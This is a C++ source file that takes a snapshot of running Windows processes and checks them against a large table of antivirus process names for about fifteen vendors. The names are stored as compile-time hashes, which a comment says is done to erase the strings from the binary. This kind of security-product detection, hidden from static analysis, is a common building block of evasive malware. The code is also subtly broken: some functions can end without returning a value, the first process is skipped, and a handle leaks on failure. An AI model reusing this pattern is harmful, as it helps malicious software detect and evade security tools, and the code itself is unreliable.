#include "CAvList.h"
#include <Windows.h>
#include <type_traits>
#include <TlHelp32.h>
#include <vector>

_CCAPI_BEGIN
template <typename T>
constexpr unsigned int BKDRHashEx(T str)
{
	if (str == nullptr)
		return 0;

	const unsigned int seed = 131; // 31 131 1313 13131 131313 etc..
	unsigned int hash = 0;

	while (*str)
	{
		hash = hash * seed + (*str++);
	}
	hash = (hash & 0x7FFFFFFF);
	return hash;
}

// 通过模板可以在编译时抹掉字符串
#define CompileTimeBKDRHash(x) std::integral_constant<const unsigned int, BKDRHashEx(x)>::value 
#define CTBH CompileTimeBKDRHash


AvList::AvList():m_isChecked(false)
{
}

bool AvList:: Init()
{
	if (!m_isChecked)
	{
		return CheckAllAvProc();
	}
}

bool AvList::ReviewInit()
{
	return CheckAllAvProc();
}


bool EnumProcessBkdrHash(std::vector< unsigned int>& procVec)
{
	PROCESSENTRY32W pe;
	DWORD id = 0;
	auto* hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe.dwSize = sizeof(PROCESSENTRY32W);
	if (!Process32FirstW(hSnapshot, &pe))
		return false;

	while (true)
	{
		pe.dwSize = sizeof(PROCESSENTRY32W);
		if (Process32NextW(hSnapshot, &pe) == FALSE)
			break;

		procVec.push_back(BKDRHashEx(const_cast<wchar_t*>(pe.szExeFile)));

	}
	CloseHandle(hSnapshot);
	return true;
}

bool AvList::CheckAllAvProc()
{
	memset(m_IsAvExist, 0, sizeof(m_IsAvExist));

	AV_INFO lAvInfoList[] = {
		// 360
		{CTBH(L"360tray.exe"),EnumAvType::_360},
		{CTBH(L"360safe.exe"),EnumAvType::_360},
		{CTBH(L"ZhuDongFangYu.exe"),EnumAvType::_360},
		{CTBH(L"360rp.exe"),EnumAvType::_360},
		{CTBH(L"safeboxTray.exe"),EnumAvType::_360},
		{CTBH(L"360safebox.exe"),EnumAvType::_360},
		{CTBH(L"360sd.exe"),EnumAvType::_360},
		{CTBH(L"QHActiveDefense.exe"),EnumAvType::_360},
		{CTBH(L"QHWatchdog.exe"),EnumAvType::_360},
		{CTBH(L"QHSafeTray.exe"),EnumAvType::_360},
		{CTBH(L"QHSafeMain.exe"),EnumAvType::_360},

		// windows def		 
		{CTBH(L"MsMpEng.exe"),EnumAvType::_WinDef},
		{CTBH(L"mssecess.exe"),EnumAvType::_WinDef},

		// 诺顿			   
		{CTBH(L"ccSvcHst.exe"),EnumAvType::_Norton},
		{CTBH(L"rtvscan.exe"),EnumAvType::_Norton},
		{CTBH(L"ccapp.exe"),EnumAvType::_Norton},
		{CTBH(L"NPFMntor.exe"),EnumAvType::_Norton},
		{CTBH(L"ccRegVfy.exe"),EnumAvType::_Norton},
		{CTBH(L"alertsvc.exe"),EnumAvType::_Norton},
		{CTBH(L"defwatch.exe"),EnumAvType::_Norton},
		{CTBH(L"lucomserver.exe"),EnumAvType::_Norton},
		{CTBH(L"navapsvc.exe"),EnumAvType::_Norton},
		{CTBH(L"navapw32.exe"),EnumAvType::_Norton},
		{CTBH(L"navw32.exe"),EnumAvType::_Norton},
		{CTBH(L"nisserv.exe"),EnumAvType::_Norton},
		{CTBH(L"nisum.exe"),EnumAvType::_Norton},
		{CTBH(L"nmain.exe"),EnumAvType::_Norton},
		{CTBH(L"NSMDTR.exe"),EnumAvType::_Norton},
		{CTBH(L"NAVAPSVC.exe"),EnumAvType::_Norton},
		{CTBH(L"NAVAPW32.exe"),EnumAvType::_Norton},
		{CTBH(L"NAVLU32.exe"),EnumAvType::_Norton},
		{CTBH(L"NAVW32.exe"),EnumAvType::_Norton},
		{CTBH(L"NISSERV.exe"),EnumAvType::_Norton},
		{CTBH(L"NISUM.exe"),EnumAvType::_Norton},
		{CTBH(L"NMAIN.exe"),EnumAvType::_Norton},
		{CTBH(L"DEFWATCH.exe"),EnumAvType::_Norton},

		{CTBH(L"SPBBCSVC.exe"),EnumAvType::_Symantec},
		{CTBH(L"SYMLCSVC.exe"),EnumAvType::_Symantec},
		{CTBH(L"NPROTECT.exe"),EnumAvType::_Symantec},
		{CTBH(L"SYMPROXYSVC.exe"),EnumAvType::_Symantec},
		{CTBH(L"SYMSPORT.exe"),EnumAvType::_Symantec},
		{CTBH(L"SYMWSC.exe"),EnumAvType::_Symantec},
		{CTBH(L"SYNMGR.exe"),EnumAvType::_Symantec},
		{CTBH(L"IAMAPP.exe"),EnumAvType::_Symantec},
		{CTBH(L"CCEVTMGR.exe"),EnumAvType::_Symantec},
		{CTBH(L"luall.exe"),EnumAvType::_Symantec},
		{CTBH(L"luau.exe"),EnumAvType::_Symantec},
		{CTBH(L"ccSetMgr.exe"),EnumAvType::_Symantec},
		{CTBH(L"aupdate.exe"),EnumAvType::_Symantec},
		{CTBH(L"defalert.exe"),EnumAvType::_Symantec},
		{CTBH(L"defscangui.exe"),EnumAvType::_Symantec},
		{CTBH(L"bootwarn.exe"),EnumAvType::_Symantec},

		{CTBH(L"avp.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"avp32.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"avpcc.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"avpdos32.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"avpm.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"avptc32.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"avpupd.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"_avp32.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"_avpcc.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"_avpm.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"KAV.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"KAVMM.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"KAVPF.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"KAVPFW.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"KAVSTART.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"KAVSVC.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"kavpf.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"kazza.exe"),EnumAvType::_Kaspersky},
		{CTBH(L"KAVSVCUI.exe"),EnumAvType::_Kaspersky},

		{CTBH(L"Mcshield.exe"),EnumAvType::_McAfee},
		{CTBH(L"Tbmon.exe"),EnumAvType::_McAfee},
		{CTBH(L"Frameworkservice.exe"),EnumAvType::_McAfee},
		{CTBH(L"firesvc.exe"),EnumAvType::_McAfee},
		{CTBH(L"firetray.exe"),EnumAvType::_McAfee},
		{CTBH(L"hipsvc.exe"),EnumAvType::_McAfee},
		{CTBH(L"mfevtps.exe"),EnumAvType::_McAfee},
		{CTBH(L"mcafeefire.exe"),EnumAvType::_McAfee},
		{CTBH(L"scan32.exe"),EnumAvType::_McAfee},
		{CTBH(L"shstat.exe"),EnumAvType::_McAfee},
		{CTBH(L"vstskmgr.exe"),EnumAvType::_McAfee},
		{CTBH(L"engineserver.exe"),EnumAvType::_McAfee},
		{CTBH(L"mfeann.exe"),EnumAvType::_McAfee},
		{CTBH(L"mcscript.exe"),EnumAvType::_McAfee},
		{CTBH(L"updaterui.exe"),EnumAvType::_McAfee},
		{CTBH(L"udaterui.exe"),EnumAvType::_McAfee},
		{CTBH(L"naprdmgr.exe"),EnumAvType::_McAfee},
		{CTBH(L"cleanup.exe"),EnumAvType::_McAfee},
		{CTBH(L"frminst.exe"),EnumAvType::_McAfee},
		{CTBH(L"mctray.exe"),EnumAvType::_McAfee},
		{CTBH(L"avconsol.exe"),EnumAvType::_McAfee},
		{CTBH(L"avsynmgr.exe"),EnumAvType::_McAfee},
		{CTBH(L"cpd.exe"),EnumAvType::_McAfee},
		{CTBH(L"mcagent.exe"),EnumAvType::_McAfee},
		{CTBH(L"mcmnhdlr.exe"),EnumAvType::_McAfee},
		{CTBH(L"mctool.exe"),EnumAvType::_McAfee},
		{CTBH(L"mcupdate.exe"),EnumAvType::_McAfee},
		{CTBH(L"mcvsrte.exe"),EnumAvType::_McAfee},
		{CTBH(L"mcvsshld.exe"),EnumAvType::_McAfee},
		{CTBH(L"mgavrtcl.exe"),EnumAvType::_McAfee},
		{CTBH(L"mgavrte.exe"),EnumAvType::_McAfee},
		{CTBH(L"mghtml.exe"),EnumAvType::_McAfee},
		{CTBH(L"mpfagent.exe"),EnumAvType::_McAfee},
		{CTBH(L"mpfservice.exe"),EnumAvType::_McAfee},
		{CTBH(L"mpftray.exe"),EnumAvType::_McAfee},
		{CTBH(L"macompatsvc.exe"),EnumAvType::_McAfee},
		{CTBH(L"mcamnsvc.exe"),EnumAvType::_McAfee},
		{CTBH(L"masvc.exe"),EnumAvType::_McAfee},
		{CTBH(L"mfemms.exe"),EnumAvType::_McAfee},
		{CTBH(L"mctary.exe"),EnumAvType::_McAfee},
		{CTBH(L"mcshield.exe"),EnumAvType::_McAfee},
		{CTBH(L"mfewc.exe"),EnumAvType::_McAfee},
		{CTBH(L"mfewch.exe"),EnumAvType::_McAfee},
		{CTBH(L"mfefw.exe"),EnumAvType::_McAfee},
		{CTBH(L"mfefire.exe"),EnumAvType::_McAfee},
		{CTBH(L"mfetp.exe"),EnumAvType::_McAfee},
		{CTBH(L"mfecanary.exe"),EnumAvType::_McAfee},
		{CTBH(L"mfeconsole.exe"),EnumAvType::_McAfee},
		{CTBH(L"mfeesp.exe"),EnumAvType::_McAfee},
		{CTBH(L"fcag.exe"),EnumAvType::_McAfee},
		{CTBH(L"fcags.exe"),EnumAvType::_McAfee},
		{CTBH(L"fcagswd.exe"),EnumAvType::_McAfee},
		{CTBH(L"fcagate.exe"),EnumAvType::_McAfee},
		{CTBH(L"SHSTAT.exe"),EnumAvType::_McAfee},
		{CTBH(L"VSHWIN32.exe"),EnumAvType::_McAfee},
		{CTBH(L"VSSTAT.exe"),EnumAvType::_McAfee},

		{CTBH(L"egui.exe"),EnumAvType::_ESET},
		{CTBH(L"ekrn.exe"),EnumAvType::_ESET},
		{CTBH(L"eguiProxy.exe"),EnumAvType::_ESET},
		{CTBH(L"NOD32.exe"),EnumAvType::_ESET},
		{CTBH(L"nod32.exe"),EnumAvType::_ESET},

		{CTBH(L"avcenter.exe"),EnumAvType::_Avira},
		{CTBH(L"avguard.exe"),EnumAvType::_Avira},
		{CTBH(L"avgnt.exe"),EnumAvType::_Avira},
		{CTBH(L"sched.exe"),EnumAvType::_Avira},
		{CTBH(L"AVIRA.exe"),EnumAvType::_Avira},

		{CTBH(L"ksafe.exe"),EnumAvType::_JinShan},
		{CTBH(L"KSWebShield.exe"),EnumAvType::_JinShan},
		{CTBH(L"KMAILMON.exe"),EnumAvType::_JinShan},
		{CTBH(L"KSafeTray.exe"),EnumAvType::_JinShan},
		{CTBH(L"KSafeSvc.exe"),EnumAvType::_JinShan},
		{CTBH(L"KWatch.exe"),EnumAvType::_JinShan},

		{CTBH(L"spidernt.exe"),EnumAvType::_DrWeb},
		{CTBH(L"SPIDERCPL.exe"),EnumAvType::_DrWeb},
		{CTBH(L"SPIDERML.exe"),EnumAvType::_DrWeb},
		{CTBH(L"SPIDERUI.exe"),EnumAvType::_DrWeb},
		{CTBH(L"CUREIT.exe"),EnumAvType::_DrWeb},
		{CTBH(L"DRWADINS.exe"),EnumAvType::_DrWeb},
		{CTBH(L"DRWEB.exe"),EnumAvType::_DrWeb},

		{CTBH(L"HipsTray.exe"),EnumAvType::_HuoRong},
		{CTBH(L"HipsDaemon.exe"),EnumAvType::_HuoRong},
		{CTBH(L"wsctrl.exe"),EnumAvType::_HuoRong},
		{CTBH(L"usysdiag.exe"),EnumAvType::_HuoRong},

		{CTBH(L"beagle.exe"),EnumAvType::_Avast},
		{CTBH(L"afwServ.exe"),EnumAvType::_Avast},
		{CTBH(L"ashDisp.exe"),EnumAvType::_Avast},
		{CTBH(L"ASHWEBSV.exe"),EnumAvType::_Avast},
		{CTBH(L"ASWUPDSV.exe"),EnumAvType::_Avast},
		{CTBH(L"ASWSCAN.exe"),EnumAvType::_Avast},

		{CTBH(L"ntrtscan.exe"),EnumAvType::_QuShi},
		{CTBH(L"patch.exe"),EnumAvType::_QuShi},
		{CTBH(L"pcscan.exe"),EnumAvType::_QuShi},
		{CTBH(L"NTRTSCAN.exe"),EnumAvType::_QuShi},
		{CTBH(L"PCCPFW.exe"),EnumAvType::_QuShi},
		{CTBH(L"PCCTLCOM.exe"),EnumAvType::_QuShi},
		{CTBH(L"TMLISTEN.exe"),EnumAvType::_QuShi},
		{CTBH(L"TMNTSRV.exe"),EnumAvType::_QuShi},
		{CTBH(L"TMPROXY.exe"),EnumAvType::_QuShi},

		{CTBH(L"QQPCTray.exe"),EnumAvType::_QQGuanJia},
		{CTBH(L"QQPCRTP.exe"),EnumAvType::_QQGuanJia},
	};

	std::vector< unsigned int> procVec;
		
	if (!EnumProcessBkdrHash(procVec))
		return false;

	for (auto indexProcHash : procVec)
	{
		for (size_t i = 0; i < sizeof(lAvInfoList) / sizeof(lAvInfoList[0]); i++)
		{
			if (indexProcHash == lAvInfoList[i].procBKDRHash)
			{
				m_IsAvExist[(int)lAvInfoList[i].AvType] = true;
			}
		}
	}
	m_isChecked = true;
}

bool AvList::CheckOneAvProc(unsigned int hash)
{

	std::vector<unsigned int> procVec;

	if (!EnumProcessBkdrHash(procVec))
		return false;

	for (auto indexProcHash : procVec)
	{
		if (indexProcHash == hash)
			return true;
	}

	return false;
}


const bool& AvList::operator[](EnumAvType i)
{
	int index = 0;
	index = (int)i;

	switch (i)
	{
	case EnumAvType::_360WD:
		m_IsAvExist[index] =  CheckOneAvProc(CTBH(L"wdswfsafe.exe"));
		break;
	default:
	{
		// 已经获取过不需要再次获取
		if (!m_isChecked)
			CheckAllAvProc();
	}
	}

	return  m_IsAvExist[index];
}
_CCAPI_END